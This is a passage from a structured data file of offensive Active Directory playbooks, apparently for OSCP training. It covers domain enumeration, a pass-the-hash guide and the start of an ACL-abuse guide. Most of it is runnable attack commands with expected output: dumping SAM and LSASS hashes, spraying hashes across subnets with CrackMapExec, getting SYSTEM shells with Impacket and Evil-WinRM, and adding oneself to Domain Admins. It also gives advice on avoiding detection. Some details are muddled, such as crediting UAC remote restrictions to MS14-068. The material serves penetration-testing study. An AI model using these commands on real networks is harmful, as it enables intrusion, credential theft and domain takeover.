unavailable or blocked."", ""commands"": [{""id"": ""net-user-domain-list"", ""example"": ""net user /domain"", ""shows"": ""User accounts for \\\\""}, {""id"": ""net-group-domain-admins"", ""example"": ""net group \""Domain Admins\"" /domain"", ""shows"": ""Group name""}, {""id"": ""net-group-domain-computers"", ""example"": ""net group \""Domain Computers\"" /domain"", ""shows"": ""Group name""}, {""id"": ""setspn-list-all"", ""example"": ""setspn -T corp.com -Q */*"", ""shows"": ""CN=""}]}, {""title"": ""Phase 3: Manual PowerShell LDAP Queries"", ""notes"": ""If PowerShell is available but you can't/won't import modules (opsec concern), use native .NET DirectorySearcher. Create the LDAPSearch function once, then run targeted queries. This approach avoids 'Invoke-' cmdlets that trigger alerts."", ""commands"": [{""id"": ""ps-ldapsearch-function"", ""example"": ""function LDAPSearch { param ([string]$LDAPQuery); $PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name; $DistinguishedName = ([adsi]'').distinguishedName; $DirectoryEntry = New-Object System.DirectoryServices.DirectoryEntry(\""LDAP://$PDC/$DistinguishedName\""); $DirectorySearcher = New-Object System.DirectoryServices.DirectorySearcher($DirectoryEntry, $LDAPQuery); return $DirectorySearcher.FindAll() }"", ""shows"": ""Function created successfully""}, {""id"": ""ps-ldapsearch-users"", ""example"": ""LDAPSearch -LDAPQuery \""(objectClass=user)\"""", ""shows"": ""Properties""}, {""id"": ""ps-ldapsearch-computers"", ""example"": ""LDAPSearch -LDAPQuery \""(objectClass=computer)\"""", ""shows"": ""dnshostname""}, {""id"": ""ps-ldapsearch-groups"", ""example"": ""LDAPSearch -LDAPQuery \""(objectClass=group)\"""", ""shows"": ""cn""}, {""id"": ""ps-ldapsearch-spns"", ""example"": ""LDAPSearch -LDAPQuery \""(&(objectClass=user)(servicePrincipalName=*))\"""", ""shows"": ""serviceprincipalname""}]}, {""title"": ""Phase 4: PowerView Comprehensive Enumeration"", ""notes"": ""If PowerView is loaded (or can be loaded), use automated cmdlets for rapid enumeration. This is the fastest approach but generates more PowerShell event log entries (4103, 4104). Use when speed > stealth."", ""commands"": [{""id"": ""powerview-get-netdomain"", ""example"": ""Get-NetDomain"", ""shows"": ""Forest""}, {""id"": ""powerview-get-netdomaincontroller"", ""example"": ""Get-NetDomainController"", ""shows"": ""Forest""}, {""id"": ""powerview-get-netuser-all"", ""example"": ""Get-NetUser | select samaccountname,description,pwdlastset,lastlogon"", ""shows"": ""samaccountname""}, {""id"": ""powerview-get-netuser-spn"", ""example"": ""Get-NetUser -SPN | select samaccountname,serviceprincipalname"", ""shows"": ""samaccountname""}, {""id"": ""powerview-get-netgroup-recursive"", ""example"": ""Get-NetGroupMember -GroupName \""Domain Admins\"" -Recurse"", ""shows"": ""MemberName""}, {""id"": ""powerview-get-netcomputer-all"", ""example"": ""Get-NetComputer | select dnshostname,operatingsystem,lastlogon"", ""shows"": ""dnshostname""}, {""id"": ""powerview-get-netou"", ""example"": ""Get-NetOU | select name,distinguishedname"", ""shows"": ""name""}, {""id"": ""powerview-get-netgpo"", ""example"": ""Get-NetGPO | select displayname,whenchanged"", ""shows"": ""displayname""}]}, {""title"": ""Phase 5: Advanced Queries (dsquery)"", ""notes"": ""Fallback option when PowerShell is blocked but dsquery.exe is available (often on older systems or DCs). Provides LDAP filter capabilities without PowerShell. Less friendly output (DNs not usernames) but same intelligence."", ""commands"": [{""id"": ""dsquery-users"", ""example"": ""dsquery user"", ""shows"": ""CN=""}, {""id"": ""dsquery-computers"", ""example"": ""dsquery computer"", ""shows"": ""CN=""}, {""id"": ""dsquery-admins"", ""example"": ""dsquery group -name \""Domain Admins\"" | dsget group -members"", ""shows"": ""CN=""}, {""id"": ""dsquery-domain-controllers"", ""example"": ""dsquery server"", ""shows"": ""CN=""}]}]"
"ad-pass-the-hash-attacks","Pass-the-Hash Attack Deep Dive - NTLM Authentication Exploitation","Complete guide to Pass-the-Hash attacks: hash extraction, format validation, authentication testing, tool usage (Impacket/Mimikatz), UAC bypass, troubleshooting","ACTIVE_DIRECTORY|PASS_THE_HASH|NTLM|LATERAL_MOVEMENT|IMPACKET|EVIL-WINRM|UAC|OSCP:HIGH","{""how_to_recognize"": [""You have NTLM hash(es) but no plaintext password and don't want to waste time cracking"", ""secretsdump or mimikatz output shows 'username:rid:lm:ntlm:::' format"", ""Need to use hash for authentication without converting to plaintext (pass-the-hash vs. password cracking)"", ""Lateral movement required but only hash available (no Kerberos ticket, no password)"", ""Testing hash validity across multiple machines (password reuse identification)""], ""when_to_look_for"": [""After dumping SAM hashes from compromised machine (secretsdump, mimikatz, reg save)"", ""When SAM contains local administrator hash that might be reused across workstations (common misconfiguration)"", ""After obtaining NTLM hash from network capture, NTDS.dit dump, or DCSync attack"", ""OSCP exam: Pass-the-hash is critical - learn to recognize hash format, use correct syntax for each tool, troubleshoot UAC restrictions""]}","[{""title"": ""Scenario 1: Understanding Pass-the-Hash (Why Does This Work?)"", ""context"": ""You dumped SAM hashes from compromised Windows workstation. Output shows 'Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::'. You wonder: can I use this hash for authentication without cracking it? Why does NTLM allow hash-based authentication? What's the security implication?"", ""approach"": ""NTLM authentication uses challenge-response protocol that never transmits password or hash directly. Instead: (1) Client requests authentication, (2) Server sends random challenge, (3) Client encrypts challenge with NTLM hash (not password), (4) Server validates encrypted response. The KEY INSIGHT: Client uses NTLM hash as encryption key - it never needs the plaintext password. If you have the hash, you can respond to challenges just like the legitimate user. This is PROTOCOL LIMITATION, not an exploit. Microsoft can't fix it without breaking backward compatibility (would require replacing NTLM entirely with Kerberos - impossible for non-domain scenarios)."", ""commands"": [""pth-verify-hash-format"", ""secretsdump-hashes""], ""expected_outcome"": ""Understand NTLM authentication flow: (1) Workstation requests login to file server, (2) Server sends 16-byte challenge: 0x1122334455667788, (3) Workstation encrypts challenge using NTLM hash as key (DES-based encryption), (4) Workstation sends encrypted response, (5) Server encrypts same challenge with hash stored in SAM, (6) Server compares: if responses match, authentication succeeds. INSIGHT: Step 3 only needs hash (31d6cfe0d16ae931b73c59d7e0c089c0), not password. Tools like Impacket and Mimikatz replicate this flow. When you pass hash to psexec, it uses hash to respond to NTLM challenges. Server doesn't know you're using hash instead of password - the protocol is identical."", ""why_this_works"": ""NTLM (NT LAN Manager) is legacy authentication protocol from Windows NT 3.1 (1993). It uses challenge-response to avoid transmitting passwords over network. NTLM hash calculation: (1) Take password 'P@ssw0rd', (2) Convert to Unicode, (3) Apply MD4 hash \u2192 32 hex characters (NTLM hash). During authentication, client uses this hash (not password) to encrypt challenges. PROBLEM: If attacker obtains hash, they can authenticate just like legitimate user. This is called 'pass-the-hash' - passing hash instead of password. Microsoft designed this for password change scenarios (client needs to prove current password without transmitting it), but it enables lateral movement. UAC mitigations added in 2014 (MS14-068) restrict non-RID-500 local admin hashes over network, but domain account hashes still work.""}, {""title"": ""Scenario 2: Hash Extraction and Format Validation"", ""context"": ""You have SYSTEM shell on Windows workstation 192.168.50.100. You need to extract NTLM hashes from local SAM database and verify format before attempting pass-the-hash. Wrong hash format wastes time - better to validate first."", ""approach"": ""Method 1 (from Kali): impacket-secretsdump -sam sam.hive -system system.hive LOCAL (requires registry hive dumps from target: reg save HKLM\\SAM sam.hive). Method 2 (from compromised Windows with Mimikatz): privilege::debug; lsadump::sam. Method 3 (remote dump from Kali with admin creds): impacket-secretsdump 'corp/admin:P@ssw0rd@192.168.50.100'. Output format: 'username:rid:lm:ntlm:::'. Extract 4th field (NTLM hash). Validate: must be exactly 32 hexadecimal characters (0-9, a-f). Example: '31d6cfe0d16ae931b73c59d7e0c089c0' = valid. '31d6cfe0d16ae931b73c59d7e0c089c' = invalid (31 chars, missing digit)."", ""commands"": [""secretsdump-hashes"", ""mimikatz-logonpasswords"", ""pth-verify-hash-format""], ""expected_outcome"": ""secretsdump output: 'Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::'. Parse fields separated by colons: Field 1 = username (Administrator), Field 2 = RID (500 = built-in Administrator), Field 3 = LM hash (aad3b... = empty password LM hash, ignore this), Field 4 = NTLM hash (31d6cfe0... = THIS IS WHAT YOU NEED), Field 5+ = empty. Extract NTLM: '31d6cfe0d16ae931b73c59d7e0c089c0'. Validate length: 32 characters. Validate characters: [0-9a-f] only. THIS HASH represents empty password (''). Real hashes look different, e.g., 'fc525c9683e8fe067095ba2ddc971889' = 'P@ssw0rd123'. Save username:hash mapping for documentation: 'Administrator:31d6cfe0d16ae931b73c59d7e0c089c0'."", ""why_this_works"": ""SAM (Security Accounts Manager) database stores local user hashes in registry hive HKLM\\SAM. File location: C:\\Windows\\System32\\config\\SAM. This file is locked while Windows running (can't copy directly). Solution: (1) Dump registry hives with 'reg save HKLM\\SAM sam.hive', (2) Extract with secretsdump offline, OR (3) Read from LSASS process memory with Mimikatz (requires SeDebugPrivilege). SAM structure: Encrypted with SYSKEY (stored in SYSTEM hive). secretsdump uses SYSTEM hive to decrypt SAM and extract hashes. Output format 'username:rid:lm:ntlm:::' is secretsdump convention (compatible with John the Ripper hash cracking format). LM hash field often shows 'aad3b435b51404eeaad3b435b51404ee' = empty LM hash (LM disabled on modern Windows). NTLM hash is what you need for pass-the-hash attacks.""}, {""title"": ""Scenario 3: Testing Hash Validity with CrackMapExec"", ""context"": ""You extracted hash 'fc525c9683e8fe067095ba2ddc971889' for user 'admin' from SAM dump. Before attempting lateral movement with Impacket, you want to quickly test if hash is valid and where it grants access. CrackMapExec provides fast hash validation and network-wide spraying."", ""approach"": ""Test single target: crackmapexec smb 192.168.50.100 -u admin -H fc525c9683e8fe067095ba2ddc971889 --local-auth. Look for [+] vs [-] indicator. [+] admin:fc525c9... (Pwn3d!) = hash is valid AND you have local admin access. [+] admin:fc525c9... = hash is valid but you're not admin. [-] admin:fc525c9... STATUS_LOGON_FAILURE = hash is invalid (wrong hash, account doesn't exist, password changed). Spray across subnet: crackmapexec smb 192.168.50.0/24 -u admin -H fc525c9683e8fe067095ba2ddc971889 --local-auth. Identify all machines where this local admin hash is reused (very common - admins use same local admin password across workstations)."", ""commands"": [""pth-cme-spray"", ""cme-smb-auth-test""], ""expected_outcome"": ""Single target test output: 'SMB 192.168.50.100 445 WORKSTATION01 [+] .\\admin:fc525c9683e8fe067095ba2ddc971889 (Pwn3d!)'. Pwn3d! indicator means: (1) Hash is valid for this account, (2) Account has local administrator privileges, (3) You can use this hash for lateral movement (PSExec, WMI, etc.). Subnet spray output: '192.168.50.100 (Pwn3d!), 192.168.50.102 (Pwn3d!), 192.168.50.105 (Pwn3d!), 192.168.50.110 (+), 192.168.50.120 (-)'. Interpretation: 3 machines (.100, .102, .105) have same local admin hash and you have admin access. 1 machine (.110) accepts hash but you're not admin (standard user 'admin' account). 1 machine (.120) rejects hash (account doesn't exist or password different). You now have 3 lateral movement targets. This saves hours vs. manually testing each machine with psexec."", ""why_this_works"": ""CrackMapExec automates NTLM authentication testing using pass-the-hash. Under the hood: (1) Connects to SMB port 445, (2) Performs NTLM authentication using provided hash (same protocol as legitimate auth, no password needed), (3) Attempts to access ADMIN$ share (requires local admin), (4) Reports result: Pwn3d! = auth succeeded + admin access, (+) = auth succeeded + standard user, (-) = auth failed. The --local-auth flag forces local account authentication (.\\admin) instead of domain (corp\\admin). This is critical for testing local admin hash reuse. Hash spraying (testing one hash against multiple targets) exploits common misconfiguration: admins set same local admin password on all workstations via GPO or manual configuration. If you compromise one machine's local admin hash, you often compromise 50+ machines instantly.""}, {""title"": ""Scenario 4: Lateral Movement with Impacket Pass-the-Hash"", ""context"": ""CrackMapExec confirmed hash 'fc525c9683e8fe067095ba2ddc971889' grants local admin access on 192.168.50.100. Now you need interactive shell to dump credentials, search files, or install persistence. Impacket suite provides three pass-the-hash tools: psexec (SYSTEM shell, binary upload), wmiexec (fileless, semi-interactive), smbexec (fileless, similar to wmiexec). Choose based on scenario."", ""approach"": ""PSExec (default choice - SYSTEM shell, most reliable): impacket-psexec -hashes :fc525c9683e8fe067095ba2ddc971889 administrator@192.168.50.100. Syntax: -hashes LM:NTLM (use empty LM hash \u2192 :NTLM). WMIExec (if PSExec detected/blocked): impacket-wmiexec -hashes :fc525c9683e8fe067095ba2ddc971889 administrator@192.168.50.100. Provides semi-interactive shell via WMI, no binary upload (stealthier). SMBExec (alternative to WMI): impacket-smbexec -hashes :fc525c9683e8fe067095ba2ddc971889 administrator@192.168.50.100. Uses SMB + task scheduler, no service creation. All three tools accept -hashes flag for pass-the-hash."", ""commands"": [""pth-impacket-psexec"", ""pth-impacket-wmiexec"", ""pth-impacket-smbexec""], ""expected_outcome"": ""PSExec output: '[*] Requesting shares on 192.168.50.100..... [*] Found writable share ADMIN$ [*] Uploading file kLqNDASz.exe [*] Opening SVCManager on 192.168.50.100..... [*] Creating service pZmQ on 192.168.50.100..... [*] Starting service pZmQ..... [!] Press help for extra shell commands Microsoft Windows [Version 10.0.19045.2006] (c) Microsoft Corporation. All rights reserved. C:\\Windows\\system32>'. Run 'whoami' \u2192 'nt authority\\system'. You have SYSTEM shell without password - only hash used for authentication. WMIExec output: '[*] SMBv3.0 dialect used [!] Launching semi-interactive shell - Careful what you execute [!] Press help for extra shell commands C:\\>'. Semi-interactive means: each command executes separately (no persistent cmd.exe process), output returns to Kali terminal. Less interactive than PSExec but fileless (no uploaded binary)."", ""why_this_works"": ""Impacket implements pass-the-hash by handling NTLM authentication natively in Python. When you provide -hashes :fc525c9..., Impacket: (1) Connects to target SMB/RPC service, (2) Receives NTLM challenge from server, (3) Encrypts challenge using provided hash (without ever needing password), (4) Sends response, (5) Server validates response against stored hash, (6) Authentication succeeds. PSExec then uploads binary and creates service (requires admin). WMIExec uses WMI Win32_Process.Create() method (requires admin, no upload). SMBExec uses scheduled tasks via SMB (requires admin, no service creation). All three work identically to password-based authentication from server's perspective - NTLM protocol doesn't distinguish between 'user knows password' vs 'attacker has hash'.""}, {""title"": ""Scenario 5: UAC Restrictions and RID-500 Bypass"", ""context"": ""You dumped local admin hash from Workstation01: 'admin:1001:...:fc525c9...'. Hash spray with CrackMapExec shows this hash works on 20+ other workstations (password reuse). But when you try 'impacket-psexec -hashes :fc525c9... admin@192.168.50.102', you get 'STATUS_ACCESS_DENIED' even though CrackMapExec showed (Pwn3d!). This is UAC Remote Restrictions (MS14-068 patch)."", ""approach"": ""Problem: Microsoft patch KB2871997 (2014) blocks network authentication for all local admin accounts EXCEPT built-in Administrator (RID 500). RID 1001 means user-created admin account - network auth blocked. Solution 1: Use built-in Administrator account hash (RID 500) instead. Extract: secretsdump shows 'Administrator:500:...:31d6cfe0...'. Use THIS hash for pass-the-hash. Solution 2: Use domain account hash (UAC restriction only affects local accounts). Solution 3: Disable UAC restriction via registry (requires existing admin access - chicken-and-egg problem). OSCP TIP: Always prioritize RID-500 Administrator hash over other local admin hashes for lateral movement."", ""commands"": [""pth-verify-hash-format"", ""secretsdump-hashes"", ""pth-impacket-psexec""], ""expected_outcome"": ""secretsdump output shows two local admin accounts: 'Administrator:500:...:8846f7eaee8fb117ad06bdd830b7586c:::' (RID 500 = built-in), 'admin:1001:...:8846f7eaee8fb117ad06bdd830b7586c:::' (RID 1001 = user-created). Notice SAME NTLM hash (8846f7...) for both - same password. Test RID-1001 hash: 'impacket-psexec -hashes :8846f7... admin@192.168.50.102' \u2192 STATUS_ACCESS_DENIED (UAC blocked). Test RID-500 hash: 'impacket-psexec -hashes :8846f7... Administrator@192.168.50.102' \u2192 SUCCESS! C:\\Windows\\system32> prompt. INSIGHT: Use Administrator account name (RID 500) even though hash is identical. UAC filter checks RID, not hash. Alternative: If you have domain account hash (corp\\dadmin:fc525c...), use that - UAC restriction doesn't apply to domain accounts: 'impacket-psexec -hashes :fc525c... corp/dadmin@192.168.50.102'."", ""why_this_works"": ""UAC (User Account Control) Remote Restrictions introduced in Windows Vista, strengthened in 2014 patch KB2871997. PURPOSE: Prevent lateral movement using local admin accounts (except RID-500). MECHANISM: When non-RID-500 local admin authenticates over network, Windows filters their token to remove admin rights - they get standard user privileges even though they're in Administrators group. This breaks PSExec, WMI, and other admin-required techniques. EXCEPTION: Built-in Administrator account (RID 500) is exempt from filtering - it always gets full admin token over network. OSCP IMPLICATION: When dumping SAM hashes, always check RID field. RID 500 = gold for lateral movement. RID 1000+ = might work on some machines (depending on patch level) but unreliable. Domain account hashes are NOT affected by UAC restrictions - they get full admin token if they're in local Administrators group.""}, {""title"": ""Scenario 6: Evil-WinRM Pass-the-Hash for Interactive Shell"", ""context"": ""You have NTLM hash and need best interactive shell from Kali (better than Impacket's semi-interactive WMIExec, more features than PSExec). Target has WinRM enabled (port 5985 open). Evil-WinRM supports pass-the-hash and provides rich PowerShell remoting with file upload/download."", ""approach"": ""Syntax: evil-winrm -i <TARGET> -u <USER> -H <NTLM_HASH>. Example: evil-winrm -i 192.168.50.100 -u administrator -H fc525c9683e8fe067095ba2ddc971889. Do NOT include colon prefix for hash (common mistake: -H :fc525c... \u2192 wrong, -H fc525c... \u2192 correct). Do NOT include LM hash (Evil-WinRM only needs NTLM). Once connected, you get fully interactive PowerShell prompt with: tab completion, command history (up arrow), multi-line commands, built-in upload/download commands."", ""commands"": [""evil-winrm-hash"", ""pth-evil-winrm""], ""expected_outcome"": ""Evil-WinRM connection output: 'Evil-WinRM shell v3.4 Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\\Users\\administrator\\Documents>'. You have interactive PowerShell. Test commands: 'whoami' \u2192 'corp\\administrator', 'hostname' \u2192 'WORKSTATION01', 'Get-Process' \u2192 list of running processes. Upload enumeration script: 'upload /opt/PowerUp.ps1 C:\\Temp\\PowerUp.ps1' \u2192 [+] Upload successful. Run script: 'Import-Module C:\\Temp\\PowerUp.ps1; Invoke-AllChecks' \u2192 PowerUp enumeration output. Download loot: 'download C:\\Users\\admin\\Desktop\\passwords.txt /home/kali/loot/passwords.txt' \u2192 [+] Download successful. Evil-WinRM provides best user experience for pass-the-hash lateral movement - prefer this over Impacket when WinRM available."", ""why_this_works"": ""Evil-WinRM is Ruby-based tool that implements PowerShell Remoting protocol with pass-the-hash support. WinRM (Windows Remote Management) uses HTTP/HTTPS (ports 5985/5986) for transport and supports NTLM authentication. When you provide -H flag, Evil-WinRM: (1) Initiates WinRM connection over HTTP, (2) Receives NTLM challenge, (3) Uses provided hash to compute challenge response, (4) Authenticates without password. WinRM then spawns PowerShell runspace in user's context (not SYSTEM like PSExec). Advantages over Impacket: (1) Fully interactive (real PowerShell session, not semi-interactive), (2) Tab completion works, (3) Multi-line commands supported, (4) Built-in upload/download (Impacket requires separate SMB session), (5) Menu system for common tasks. Disadvantages: (1) Requires WinRM enabled (not always available), (2) Runs as user (not SYSTEM), (3) Creates WinRM event logs (Event ID 6 in Microsoft-Windows-WinRM/Operational).""}]","[{""title"": ""Phase 1: Hash Extraction"", ""notes"": ""Extract NTLM hashes from compromised systems using: (1) secretsdump (from Kali) - requires SAM/SYSTEM registry hives or admin credentials for remote dump, (2) Mimikatz (from Windows) - requires SYSTEM or SeDebugPrivilege for LSASS memory access, (3) Manual registry dump - 'reg save HKLM\\SAM sam.hive' then parse offline. Output format: 'username:rid:lm:ntlm:::'. Always verify RID field - RID 500 (Administrator) bypasses UAC restrictions. Document username-to-hash mapping for tracking."", ""commands"": [{""id"": ""secretsdump-hashes"", ""example"": ""impacket-secretsdump 'corp.com/administrator:Password123!@192.168.50.70'"", ""shows"": ""Output: 'Impacket v0.10.0 - Copyright 2022 SecureAuth Cor...""}, {""id"": ""mimikatz-logonpasswords"", ""shows"": ""See command documentation""}, {""id"": ""pth-verify-hash-format"", ""example"": ""crackmapexec smb 192.168.50.73 -u administrator -H 2892D26CDF84D7A70E2EB3B9F05C425E"", ""shows"": ""[+] <DOMAIN>\\<USER>:<NTLM_HASH> (Pwn3d!)""}]}, {""title"": ""Phase 2: Hash Validation and Spraying"", ""notes"": ""Before attempting exploitation, validate hash and identify where it grants access. Use CrackMapExec for fast testing: (1) Single target - 'crackmapexec smb <TARGET> -u <USER> -H <HASH> --local-auth', look for Pwn3d! indicator. (2) Subnet spray - 'crackmapexec smb 192.168.50.0/24 -u admin -H <HASH> --local-auth', identify all vulnerable machines. (3) Domain spray - 'crackmapexec smb <DC> -u <USER> -H <HASH> -d <DOMAIN>', test domain account hash. Hash spraying exploits password reuse - same local admin password across workstations is common misconfiguration."", ""commands"": [{""id"": ""pth-cme-spray"", ""example"": ""crackmapexec smb 192.168.50.0/24 -u administrator -H 2892D26CDF84D7A70E2EB3B9F05C425E"", ""shows"": ""[+] <TARGET> (Pwn3d!)""}, {""id"": ""cme-smb-auth-test"", ""shows"": ""See command documentation""}, {""id"": ""pth-verify-hash-format"", ""example"": ""crackmapexec smb 192.168.50.73 -u administrator -H 2892D26CDF84D7A70E2EB3B9F05C425E"", ""shows"": ""[+] <DOMAIN>\\<USER>:<NTLM_HASH> (Pwn3d!)""}]}, {""title"": ""Phase 3: Lateral Movement Tool Selection"", ""notes"": ""Choose pass-the-hash tool based on requirements: (1) Evil-WinRM - Best interactive shell, requires WinRM enabled (port 5985/5986 open). Use when you need PowerShell interactivity and file transfer. (2) Impacket PSExec - SYSTEM shell, most reliable, writes binary to disk. Use when you need highest privileges. (3) Impacket WMIExec - Fileless, semi-interactive, stealthier than PSExec. Use when AV is concern. (4) Impacket SMBExec - Fileless via task scheduler, alternative to WMI. All accept -hashes :NTLM or -H NTLM syntax."", ""commands"": [{""id"": ""pth-impacket-psexec"", ""example"": ""impacket-psexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E administrator@192.168.50.73"", ""shows"": ""[*] Requesting shares on <TARGET>""}, {""id"": ""pth-impacket-wmiexec"", ""example"": ""impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E administrator@192.168.50.73"", ""shows"": ""[*] SMBv3.0 dialect used""}, {""id"": ""pth-impacket-smbexec"", ""example"": ""impacket-smbexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E administrator@192.168.50.73"", ""shows"": ""[!] Launching semi-interactive shell""}, {""id"": ""evil-winrm-hash"", ""example"": ""evil-winrm -i 192.168.50.73 -u administrator -H 64f12cddaa88057e06a81b54e73b949b"", ""shows"": ""Evil-WinRM shell v3""}]}, {""title"": ""Phase 4: UAC Restriction Bypass"", ""notes"": ""Microsoft KB2871997 (2014) blocks network authentication for local admin accounts except RID-500 Administrator. SYMPTOM: CrackMapExec shows Pwn3d! but psexec gives STATUS_ACCESS_DENIED. SOLUTION: (1) Use built-in Administrator account (RID 500) hash instead of user-created admin account, (2) Use domain account hash (UAC restriction only affects local accounts), (3) Check patch level - unpatched systems don't have restriction. Always prioritize RID-500 hash extraction from SAM dumps."", ""commands"": [{""id"": ""secretsdump-hashes"", ""example"": ""impacket-secretsdump 'corp.com/administrator:Password123!@192.168.50.70'"", ""shows"": ""Output: 'Impacket v0.10.0 - Copyright 2022 SecureAuth Cor...""}, {""id"": ""pth-impacket-psexec"", ""example"": ""impacket-psexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E administrator@192.168.50.73"", ""shows"": ""[*] Requesting shares on <TARGET>""}, {""id"": ""pth-verify-hash-format"", ""example"": ""crackmapexec smb 192.168.50.73 -u administrator -H 2892D26CDF84D7A70E2EB3B9F05C425E"", ""shows"": ""[+] <DOMAIN>\\<USER>:<NTLM_HASH> (Pwn3d!)""}]}, {""title"": ""Phase 5: Post-Compromise Credential Harvesting"", ""notes"": ""After successful pass-the-hash lateral movement, immediately dump credentials from new machine for further access: (1) SAM hashes - 'reg save HKLM\\SAM' then secretsdump, (2) LSASS memory - Mimikatz sekurlsa::logonpasswords (requires SYSTEM shell from PSExec), (3) Domain cached credentials - secretsdump -security option. Test newly obtained hashes with CrackMapExec spray - identify additional targets. Rinse and repeat until Domain Admin obtained or all targets compromised."", ""commands"": [{""id"": ""secretsdump-hashes"", ""example"": ""impacket-secretsdump 'corp.com/administrator:Password123!@192.168.50.70'"", ""shows"": ""Output: 'Impacket v0.10.0 - Copyright 2022 SecureAuth Cor...""}, {""id"": ""mimikatz-logonpasswords"", ""shows"": ""See command documentation""}, {""id"": ""pth-cme-spray"", ""example"": ""crackmapexec smb 192.168.50.0/24 -u administrator -H 2892D26CDF84D7A70E2EB3B9F05C425E"", ""shows"": ""[+] <TARGET> (Pwn3d!)""}]}, {""title"": ""Phase 6: Troubleshooting Pass-the-Hash Failures"", ""notes"": ""Common failures: (1) STATUS_LOGON_FAILURE - Hash is wrong (verify format: 32 hex chars), account disabled, or hash changed. Retest with CrackMapExec. (2) STATUS_ACCESS_DENIED - Hash works but UAC blocking (use RID-500 or domain account). (3) Connection timeout - Firewall blocking (verify ports with nmap). (4) Hash format error - Impacket uses -hashes :NTLM (colon prefix for empty LM), Evil-WinRM uses -H NTLM (no colon). (5) WinRM hash fails but SMB works - User not in Remote Management Users group (try PSExec instead)."", ""commands"": [{""id"": ""pth-verify-hash-format"", ""example"": ""crackmapexec smb 192.168.50.73 -u administrator -H 2892D26CDF84D7A70E2EB3B9F05C425E"", ""shows"": ""[+] <DOMAIN>\\<USER>:<NTLM_HASH> (Pwn3d!)""}, {""id"": ""cme-smb-auth-test"", ""shows"": ""See command documentation""}, {""id"": ""lateral-movement-troubleshooting"", ""example"": ""# Test credentials: crackmapexec smb 192.168.45.100 -u admin -p password\n# Test admin access: crackmapexec smb 192.168.45.100 -u admin -p password --shares\n# Test hash: crackmapexec smb 192.168.45.100 -u admin -H abc123...\n# Check UAC restriction: If local admin hash fails but domain user works, UAC blocking PTH\n# Verify ports: sudo nmap -p 135,445,5985 -Pn -v 192.168.45.100\n# Check firewall: Test-NetConnection 192.168.45.100 -Port 80 from Windows\n# Time sync: net time \\\\192.168.45.100 (Kerberos requires <5 min time skew)\n# Service status: Get-Service WinRM,RpcSs -ComputerName 192.168.45.100"", ""shows"": ""[+] Pwn3d! from CrackMapExec (admin access confirmed)""}]}]"
"ad-permission-abuse-hunting","Active Directory Permission Abuse Hunting","Identify and exploit excessive ACL permissions (GenericAll, WriteDACL, WriteOwner, ForceChangePassword) for privilege escalation and lateral movement","ACTIVE_DIRECTORY|ACL|PERMISSIONS|PRIVILEGE_ESCALATION|GENERICALL|WRITEDACL|WRITEOWNER|OSCP:HIGH","{""how_to_recognize"": [""You have domain user credentials but need privilege escalation vector"", ""Initial reconnaissance shows complex OU structure (delegated administration)"", ""Looking for non-standard privilege escalation paths (not Kerberoasting)"", ""ACL misconfiguration often occurs in environments with delegated helpdesk/admin roles""], ""when_to_look_for"": [""After Kerberoasting yields no crackable hashes"", ""When you control a low-privilege account and need path to Domain Admins"", ""In environments with multiple OUs/departments (delegated permissions common)"", ""OSCP exam: Check ACLs on privileged groups (Domain Admins, Enterprise Admins) and service accounts""]}","[{""title"": ""Scenario 1: GenericAll on User Account - Password Reset Path"", ""context"": ""You compromised 'corp\\helpdesk' account. Initial reconnaissance shows another account 'corp\\sqlservice' exists with local admin rights on multiple servers. You need to pivot to sqlservice account but don't have credentials. ACL enumeration reveals helpdesk has GenericAll permission on sqlservice account."", ""approach"": ""GenericAll = Full control over the object. On user accounts, this includes: reset password (without knowing current password), modify account attributes, read all properties. Use Get-ObjectAcl to confirm the permission, then use Set-DomainUserPassword (PowerView) or native PowerShell to reset sqlservice's password. Maintain stealth by recording original password hash first (if possible)."", ""commands"": [""powerview-get-objectacl-genericall"", ""powerview-convert-sidtoname"", ""powerview-find-interestingdomainacl""], ""expected_outcome"": ""Get-ObjectAcl shows: SecurityIdentifier: S-1-5-21-...-1105 (helpdesk), ActiveDirectoryRights: GenericAll, ObjectDN: CN=sqlservice,CN=Users,DC=corp,DC=com. Convert SID to confirm it's your account. You can now reset sqlservice password: $NewPassword = ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force; Set-DomainUserPassword -Identity sqlservice -AccountPassword $NewPassword. Authenticate as sqlservice and gain admin access to target servers."", ""why_this_works"": ""Active Directory ACLs control who can perform actions on AD objects. GenericAll is the most permissive ACE - it grants full control equivalent to ownership. On user objects, this includes the 'User-Force-Change-Password' extended right. When you reset a password, AD doesn't require the current password (unlike user-initiated password changes). This is by design for helpdesk scenarios but becomes a privilege escalation vector when over-delegated.""}, {""title"": ""Scenario 2: GenericAll on Group - Add Self to Domain Admins"", ""context"": ""You control 'corp\\backupuser' account. ACL enumeration shows backupuser has GenericAll permission on 'Domain Admins' group (common misconfiguration in environments with backup software that needs admin rights). This is a direct path to Domain Admin."", ""approach"": ""GenericAll on a group allows adding/removing members without being a group member yourself. Use Add-DomainGroupMember (PowerView) or native PowerShell (Add-ADGroupMember) to add your account to Domain Admins. Maintain stealth by only keeping membership active for necessary time window, then remove yourself."", ""commands"": [""powerview-get-objectacl-group"", ""powerview-find-interestingdomainacl"", ""powerview-get-netgroup-recursive""], ""expected_outcome"": ""Get-ObjectAcl -Identity 'Domain Admins' reveals backupuser has GenericAll. Run: Add-DomainGroupMember -Identity 'Domain Admins' -Members 'backupuser'. Verify with: Get-NetGroupMember -GroupName 'Domain Admins'. Your account now has Domain Admin rights. You can now DCSync, access any system, dump NTDS.dit, etc. This is a critical finding - immediate privilege escalation from low-priv user to full domain compromise."", ""why_this_works"": ""Group membership controls are governed by ACLs on the group object. GenericAll includes the 'WriteProperty' right on all attributes, including 'member' (group membership). Adding yourself to Domain Admins doesn't require approval or authentication - if the ACL allows it, AD will process the modification. This is why ACL auditing is critical - these permissions are often invisible to administrators who focus on group membership rather than group ACLs.""}, {""title"": ""Scenario 3: WriteDACL Permission - Grant Yourself GenericAll"", ""context"": ""You control 'corp\\auditor' account. Target is 'corp\\admin-svc' (domain admin account). Direct enumeration shows you DON'T have 